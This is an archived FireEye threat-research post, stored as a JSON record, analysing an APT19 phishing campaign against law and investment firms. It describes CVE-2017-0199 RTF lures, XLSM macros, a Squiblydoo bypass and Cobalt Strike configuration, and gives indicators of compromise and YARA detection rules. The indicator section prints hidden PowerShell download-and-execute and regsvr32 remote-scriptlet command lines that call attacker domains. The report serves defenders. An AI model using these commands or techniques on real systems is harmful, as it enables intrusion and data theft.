{
    "id": "e6cf0bcf-34a9-472f-a2d8-9b1807cf2e95",
    "created_at": "2023-01-12T15:01:33.370823Z",
    "updated_at": "2025-03-27T02:13:31.36112Z",
    "deleted_at": null,
    "sha1_hash": "e3afd5cd99496521eaa77c98498360c280301e8d",
    "title": "2017-06-06 - Privileges and Credentials- Phished at the Request of Counsel",
    "authors": "",
    "file_creation_date": "2022-10-02T12:01:05Z",
    "file_modification_date": "2022-10-02T12:01:05Z",
    "file_size": 1624799,
    "plain_text": "# Privileges and Credentials: Phished at the Request of Counsel\n\n**[mandiant.com/resources/blog/phished-at-the-request-of-counsel](https://www.mandiant.com/resources/blog/phished-at-the-request-of-counsel)**\n\n## Breadcrumb\n\nThreat Research\n\nIan Ahl\n\nJun 06, 2017\n\n9 mins read\n\n**Summary**\n\n\n-----\n\nIn May and June 2017, FireEye observed a phishing campaign targeting at least seven\nglobal law and investment firms. We have associated this campaign with APT19, a group\nthat we assess is composed of freelancers, with some degree of sponsorship by the Chinese\ngovernment.\n\nAPT19 used three different techniques to attempt to compromise targets. In early May, the\nphishing lures leveraged RTF attachments that exploited the Microsoft Windows vulnerability\n[described in CVE 2017-0199. Toward the end of May, APT19 switched to using macro-](https://www.mandiant.com/resources/cve-2017-0199-wild-attacks-leveraging-hta-handler)\nenabled Microsoft Excel (XLSM) documents. In the most recent versions, APT19 added an\napplication whitelisting bypass to the XLSM documents. At least one observed phishing lure\ndelivered a Cobalt Strike payload.\n\nAs of the writing of this blog post, FireEye had not observed post-exploitation activity by the\nthreat actors, so we cannot assess the goal of the campaign. We have previously observed\nAPT19 steal data from law and investment firms for competitive economic purposes.\n\nThis purpose of this blog post is to inform law firms and investment firms of this phishing\ncampaign and provide technical indicators that their IT personnel can use for proactive\nhunting and detection.\n\n**The Emails**\n\nAPT19 phishing emails from this campaign originated from sender email accounts from the\n\"@cloudsend[.]net\" domain and used a variety of subjects and attachment names. Refer to\nthe Indicators of Compromise section for more details.\n\n**The Attachments**\n\nAPT19 leveraged Rich Text Format (RTF) and macro-enabled Microsoft Excel (XLSM) files\nto deliver their initial exploits. The following sections describe the two methods in further\ndetail.\n\nRTF Attachments\n\n[Through the exploitation of the HTA handler vulnerability described in CVE-2017-1099, the](https://www.mandiant.com/resources/cve-2017-0199-wild-attacks-leveraging-hta-handler)\nobserved RTF attachments download hxxp://tk-in-f156.2bunny[.]com/Agreement.doc.\nUnfortunately, this file was no longer hosted at tk-in-f156.2bunny[.]com for further analysis.\nFigure 1 is a screenshot of a packet capture showing one of the RTF files reaching out to\nhxxp://tk-in-f156.2bunny[.]com/Agreement.doc.\n\n\n-----\n\nFigure 1: RTF PCAP\n\n**XLSM Attachments**\n\nThe XLSM attachments contained multiple worksheets with content that reflected the\nattachment name. The attachments also contained an image that requested the user to\n“Enable Content”, which would enable macro support if it was disabled. Figure 2 provides a\nscreenshot of one of the XLSM files (MD5:30f149479c02b741e897cdb9ecd22da7).\n\nFigure 2: Enable macros\nOne of the malicious XLSM attachments that we observed contained a macro that:\n\n1. Determined the system architecture to select the correct path for PowerShell\n2. Launched a ZLIB compressed and Base64 encoded command with PowerShell. This is\n\na typical technique used by Meterpreter stagers.\n\nFigure 3 depicts the macro embedded within the XLSM file (MD5:\n38125a991efc6ab02f7134db0ebe21b6).\n\n\n-----\n\nFigure 3: XLSX Macro\n\n\n-----\n\nFigure 4 contains the decoded output of the encoded text.\n\nFigure 4: Decoded ZLIB + Base64 payload\nThe shellcode invokes PowerShell to issue a HTTP GET request for a random four (4)\ncharacter URI on the root of autodiscovery[.]2bunny[.]com. The requests contain minimal\nHTTP headers since the PowerShell command is executed with mostly default parameters.\nFigure 5 depicts an HTTP GET request generated by the payload, with minimal HTTP\nheaders.\n\nFigure 5: GET Request with minimal HTTP headers\n\n\n-----\n\nConverting the shellcode to ASCII and removing the non-printable characters provides a\nquick way to pull out network-based indicators (NBI) from the shellcode. Figure 6 shows the\nextracted NBIs.\n\nFigure 6: Decoded shellcode\nFireEye also identified an alternate macro in some of the XLSM documents, displayed in\nFigure 7.\n\nFigure 7: Alternate macro\nThis macro uses Casey Smith’s “Squiblydoo” Application Whitelisting bypass technique to\nrun the command in Figure 8.\n\nFigure 8: Application Whitelisting Bypass\nThe command in Figure 8 downloads and launches code within an SCT file. The SCT file in\nthe payload (MD5: 1554d6fe12830ae57284b389a1132d65) contained the code shown in\nFigure 9.\n\n\n-----\n\nFigure 9: SCT contents\nFigure 10 provides the decoded script. Notice the “$DoIt” string, which is usually indicative of\na Cobalt Strike payload.\n\n\n-----\n\nFigure 10: Decoded SCT contents\nA quick conversion of the contents of the variable “$var_code” from Base64 to ASCII shows\nsome familiar network indicators, shown in Figure 11.\n\n\n-----\n\nFigure 11: $var_code to ASCII\n\n**Second Stage Payload**\n\nOnce the XLSM launches its PowerShell command, it downloads a typical Cobalt Strike\nBEACON payload, configured with the following parameters:\n\nProcess Inject Targets:\n\n%windir%\\syswow64\\rundll32.exe\n%windir%\\sysnative\\rundll32.exe\nc2_user_agents\n\nMozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;\nFunWebProducts; IE0006_ver1;EN_GB)\nNamed Pipes\n\n\\\\%s\\pipe\\msagent_%x\nbeacon_interval\n\n60\nC2\n\nautodiscover.2bunny[.]com/submit.php\nautodiscover.2bunny[.]com/IE9CompatViewList.xml\nsfo02s01-in-f2.cloudsend[.]net/submit.php\nsfo02s01-in-f2.cloudsend[.]net/IE9CompatViewList.xml\nC2 Port\n\nTCP/80\n\nFigure 12 depicts an example of a BEACON C2 attempt from this payload.\n\nFigure 12: Cobalt Strike BEACON C2\n\n**FireEye Product Detections**\n\nThe following FireEye products currently detect and block the methods described above.\nTable 1 lists the current detection and blocking capabilities by product.\n\n\n-----\n\n**Detection Name** **Product** **Action** **Notes**\n\n\nSUSPICIOUS POWERSHELL USAGE\n(METHODOLOGY)\n\n\nHX Detect XSLM Macro\nlaunch\n\n\nGen:Variant.Application.HackTool.CobaltStrike.1 HX Detect XSLM Macro\nlaunch\n\nMalware Object HX Detect BEACON\nwritten to disk\n\nBackdoor.BEACON NX Block* BEACON\nCallback\n\nFE_Malformed_RTF EX/ETP/NX Block* RTF\n\nMalware.Binary.rtf EX/ETP/NX Block* RTF\n\nMalware.Binary EX/ETP/NX Block* RTF\n\nMalware.Binary.xlsx EX/ETP/NX Block* XSLM\n\nTable 1: Detection review\n\n_*Appliances must be configured for block mode._\n\n**Recommendations**\n\nFireEye recommends organizations perform the following steps to mitigate the risk of this\ncampaign:\n\n[1. Microsoft Office users should apply the patch from Microsoft as soon as possible, if](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2017-0199)\n\nthey have not already installed it.\n2. Search historic and future emails that match the included indicators of compromise.\n3. Review web proxy logs for connections to the included network based indicators of\n\ncompromise.\n4. Block connections to the included fully qualified domain names.\n5. Review endpoints for the included host based indicators of compromise.\n\n**Indicators of Compromise**\n\n\n-----\n\nThe following section provides the IOCs for the variants of the phishing emails and malicious\npayloads that FireEye has observed during this campaign.\n\nEmail Senders\n\nPressReader <infodept@cloudsend[.]net>\nAngela Suh <angela.suh@cloudsend[.]net>\nAshley Safronoff <ashley.safronoff@cloudsend[.]net>\nLindsey Hersh <lindsey.hersh@cloudsend[.]net>\nSarah Roberto sarah.roberto@cloudsend[.]net\nnoreply@cloudsend[.]net\n\nEmail Subject Lines\n\nMacron Denies Authenticity Of Leak, French Prosecutors Open Probe\nMacron Document Leaker Releases New Images, Promises More Information\nAre Emmanuel Macron's Tax Evasion Documents Real?\nTime Allocation\nVacancy Report\nchina paper table and graph\nresults with zeros – some ready not all finished\nMacron Leaks contain secret plans for the islamisation of France and Europe\n\nAttachment Names\n\nMacron_Authenticity.doc.rtf\nMacron_Information.doc.rtf\nUS and EU Trade with China and China CA.xlsm\nTables 4 5 7 Appendix with zeros.xlsm\nProject Codes - 05.30.17.xlsm\nWeekly Vacancy Status Report 5-30-15.xlsm\nMacron_Tax_Evasion.doc.rtf\nMacron_secret_plans.doc.rtf\n\nNetwork Based Indicators (NBI)\n\nlyncdiscover.2bunny[.]com\nautodiscover.2bunny[.]com\nlyncdiscover.2bunny[.]com:443/Autodiscover/AutodiscoverService/\nlyncdiscover.2bunny[.]com/Autodiscover\nautodiscover.2bunny[.]com/K5om\nsfo02s01-in-f2.cloudsend[.]net/submit.php\nsfo02s01-in-f2.cloudsend[.]net/IE9CompatViewList.xml\ntk-in-f156.2bunny[.]com\ntk-in-f156.2bunny[.]com/Agreement.doc\n104.236.77[.]169\n\n\n-----\n\n138.68.45[.]9\n162.243.143[.]145\nMozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts;\nIE0006_ver1;EN_GB)\ntf-in-f167.2bunny[.]com:443 (*Only seen in VT not ITW)\n\nHost Based Indicators (HBI)\n\nRTF MD5 hash values\n\n0bef39d0e10b1edfe77617f494d733a8\n0e6da59f10e1c4685bb5b35a30fc8fb6\ncebd0e9e05749665d893e78c452607e2\n\nXLSX MD5 hash values\n\n38125a991efc6ab02f7134db0ebe21b6\n3a1dca21bfe72368f2dd46eb4d9b48c4\n30f149479c02b741e897cdb9ecd22da7\n\nBEACON and Meterpreter payload MD5 hash values\n\nbae0b39197a1ac9e24bdf9a9483b18ea\n1151619d06a461456b310096db6bc548\n\nProcess arguments, named pipes, and file paths\n\npowershell.exe -NoP -NonI -W Hidden -Command \"Invoke-Expression $(New-Object\nIO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object\nIO.MemoryStream (,$([Convert]::FromBase64String(\"<base64 blob>\")\nregsvr32.exe /s /n /u /i:hxxps://lyncdiscover.2bunny.com/Autodiscover scrobj.dll\n\\\\<ip>\\pipe\\msagent_<4 digits>\nC:\\Documents and Settings\\<user>\\Local Settings\\Temp\\K5om.dll (4 character DLL\nbased on URI of original GET request)\n\nYara Rules\n\n\n-----\n\nrule FE_LEGALSTRIKE_MACRO {\n\nmeta:version=\".1\"\n\nfiletype=\"MACRO\"\n\nauthor=\"Ian.Ahl@fireeye.com @TekDefense\"\n\ndate=\"2017-06-02\"\n\ndescription=\"This rule is designed to identify macros with the specific encoding used\nin the sample 30f149479c02b741e897cdb9ecd22da7.\"\n\nstrings:\n\n// OBSFUCATION\n\n$ob1 = \"ChrW(114) & ChrW(101) & ChrW(103) & ChrW(115) & ChrW(118) &\nChrW(114) & ChrW(51) & ChrW(50) & ChrW(46) & ChrW(101)\" ascii wide\n\n$ob2 = \"ChrW(120) & ChrW(101) & ChrW(32) & ChrW(47) & ChrW(115) & ChrW(32)\n& ChrW(47) & ChrW(110) & ChrW(32) & ChrW(47)\" ascii wide\n$ob3 = \"ChrW(117) & ChrW(32) & ChrW(47) & ChrW(105) & ChrW(58) & ChrW(104)\n& ChrW(116) & ChrW(116) & ChrW(112) & ChrW(115)\" ascii wide\n\n$ob4 = \"ChrW(58) & ChrW(47) & ChrW(47) & ChrW(108) & ChrW(121) & ChrW(110)\n& ChrW(99) & ChrW(100) & ChrW(105) & ChrW(115)\" ascii wide\n\n$ob5 = \"ChrW(99) & ChrW(111) & ChrW(118) & ChrW(101) & ChrW(114) & ChrW(46)\n& ChrW(50) & ChrW(98) & ChrW(117) & ChrW(110)\" ascii wide\n\n$ob6 = \"ChrW(110) & ChrW(121) & ChrW(46) & ChrW(99) & ChrW(111) & ChrW(109)\n& ChrW(47) & ChrW(65) & ChrW(117) & ChrW(116)\" ascii wide\n\n$ob7 = \"ChrW(111) & ChrW(100) & ChrW(105) & ChrW(115) & ChrW(99) &\nChrW(111) & ChrW(118) & ChrW(101) & ChrW(114) & ChrW(32)\" ascii wide\n\n$ob8 = \"ChrW(115) & ChrW(99) & ChrW(114) & ChrW(111) & ChrW(98) & ChrW(106)\n& ChrW(46) & ChrW(100) & ChrW(108) & ChrW(108)\" ascii wide\n\n$obreg1 = /(\\w{5}\\s&\\s){7}\\w{5}/\n\n$obreg2 = /(Chrw\\(\\d{1,3}\\)\\s&\\s){7}/\n\n// wscript\n\n$wsobj1 = \"Set Obj = CreateObject(\\\"WScript.Shell\\\")\" ascii wide\n\n$wsobj2 = \"Obj.Run \" ascii wide\n\ncondition:\n\n(\n\n(\n\n(uint16(0) != 0x5A4D)\n\n)\n\nand\n\n(\n\nall of ($wsobj*) and 3 of ($ob*)\n\nor\n\nall of ($wsobj*) and all of ($obreg*)\n\n)\n\n)\n\n}\n\n\n-----\n\nrule FE_LEGALSTRIKE_MACRO_2 {\n\nmeta:version=\".1\"\n\nfiletype=\"MACRO\"\n\nauthor=\"Ian.Ahl@fireeye.com @TekDefense\"\n\ndate=\"2017-06-02\"\n\ndescription=\"This rule was written to hit on specific variables and powershell\ncommand fragments as seen in the macro found in the XLSX\nfile3a1dca21bfe72368f2dd46eb4d9b48c4.\"\n\nstrings:\n\n// Setting the environment\n\n$env1 = \"Arch = Environ(\\\"PROCESSOR_ARCHITECTURE\\\")\" ascii wide\n\n$env2 = \"windir = Environ(\\\"windir\\\")\" ascii wide\n\n$env3 = \"windir + \\\"\\\\syswow64\\\\windowspowershell\\\\v1.0\\\\powershell.exe\\\"\" ascii\nwide\n\n// powershell command fragments\n\n$ps1 = \"-NoP\" ascii wide\n\n$ps2 = \"-NonI\" ascii wide\n\n$ps3 = \"-W Hidden\" ascii wide\n\n$ps4 = \"-Command\" ascii wide\n$ps5 = \"New-Object IO.StreamReader\" ascii wide\n\n$ps6 = \"IO.Compression.DeflateStream\" ascii wide\n\n$ps7 = \"IO.MemoryStream\" ascii wide\n\n$ps8 = \",$([Convert]::FromBase64String\" ascii wide\n\n$ps9 = \"ReadToEnd();\" ascii wide\n\n$psregex1 = /\\W\\w+\\s+\\s\\\".+\\\"/\n\ncondition:\n\n(\n\n(\n\n(uint16(0) != 0x5A4D)\n\n)\n\nand\n\n(\n\nall of ($env*) and 6 of ($ps*)\n\nor\n\nall of ($env*) and 4 of ($ps*) and all of ($psregex*)\n\n)\n\n)\n\n}\n\n\n-----\n\nrule FE_LEGALSTRIKE_RTF {\nmeta:\n\nversion=\".1\"\n\nfiletype=\"MACRO\"\n\nauthor=\"joshua.kim@FireEye.com\"\n\ndate=\"2017-06-02\"\n\ndescription=\"Rtf Phishing Campaign leveraging the CVE 2017-0199 exploit, to point\nto the domain 2bunnyDOTcom\"\n\nstrings:\n$header = \"{\\\\rt\"\n\n$lnkinfo = \"4c0069006e006b0049006e0066006f\"\n\n$encoded1 = \"4f4c45324c696e6b\"\n\n$encoded2 = \"52006f006f007400200045006e007400720079\"\n\n$encoded3 = \"4f0062006a0049006e0066006f\"\n\n$encoded4 = \"4f006c0065\"\n\n$http1 = \"68{\"\n\n$http2 = \"74{\"\n\n$http3 = \"07{\"\n\n// 2bunny.com\n\n$domain1 = \"32{\\\\\"\n\n$domain2 = \"62{\\\\\"\n\n$domain3 = \"75{\\\\\"\n\n$domain4 = \"6e{\\\\\"\n\n$domain5 = \"79{\\\\\"\n\n$domain6 = \"2e{\\\\\"\n\n$domain7 = \"63{\\\\\"\n\n$domain8 = \"6f{\\\\\"\n\n$domain9 = \"6d{\\\\\"\n\n$datastore = \"\\\\*\\\\datastore\"\n\ncondition:\n\n$header at 0 and all of them\n\n}\n\n**Acknowledgements**\n\nJoshua Kim, Nick Carr, Gerry Stellatos, Charles Carmakal, TJ Dahms, Nick Richard, Barry\nVengerik, Justin Prosco, Christopher Glyer\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-06-06 - Privileges and Credentials- Phished at the Request of Counsel.pdf"
    ],
    "report_names": [
        "2017-06-06 - Privileges and Credentials- Phished at the Request of Counsel.pdf"
    ],
    "threat_actors": [
        {
            "id": "1f3cf3d1-4764-4158-a216-dd6352e671bb",
            "created_at": "2022-10-25T15:50:23.837615Z",
            "updated_at": "2025-03-27T02:00:55.556414Z",
            "deleted_at": null,
            "main_name": "APT19",
            "aliases": [
                "APT19",
                "Codoso",
                "C0d0so0",
                "Codoso Team",
                "Sunshop Group"
            ],
            "source_name": "MITRE:APT19",
            "tools": [
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "7a9a7873-8e41-40ae-9d06-b27c92bb54e4",
            "created_at": "2022-10-25T16:47:55.568362Z",
            "updated_at": "2025-03-27T02:05:17.264615Z",
            "deleted_at": null,
            "main_name": "BRONZE FIRESTONE",
            "aliases": [
                "C0d0s0",
                "Deep Panda ",
                "Pupa ",
                "TG-3551 ",
                "APT19 "
            ],
            "source_name": "Secureworks:BRONZE FIRESTONE",
            "tools": [
                " Alice's Rabbit Hole",
                " Briba",
                " Cobalt Strike",
                " Derusbi",
                " PlugX",
                " PoisonIvy",
                " Powershell Empire",
                " Zuguo",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "46a151bd-e4c2-46f9-aee9-ee6942b01098",
            "created_at": "2023-01-06T13:46:38.288168Z",
            "updated_at": "2025-03-27T02:00:02.794118Z",
            "deleted_at": null,
            "main_name": "APT19",
            "aliases": [
                "Black Vine",
                "TEMP.Avengers",
                "PinkPanther",
                "G0073",
                "KungFu Kittens",
                "Group 13",
                "Shell Crew",
                "BRONZE FIRESTONE",
                "G0009",
                "Sunshop Group",
                "DEEP PANDA",
                "Codoso"
            ],
            "source_name": "MISPGALAXY:APT19",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535693,
    "ts_updated_at": 1743041611,
    "ts_creation_date": 1664712065,
    "ts_modification_date": 1664712065,
    "files": {
        "pdf": "https://archive.orkl.eu/e3afd5cd99496521eaa77c98498360c280301e8d.pdf",
        "text": "https://archive.orkl.eu/e3afd5cd99496521eaa77c98498360c280301e8d.txt",
        "img": "https://archive.orkl.eu/e3afd5cd99496521eaa77c98498360c280301e8d.jpg"
    }
}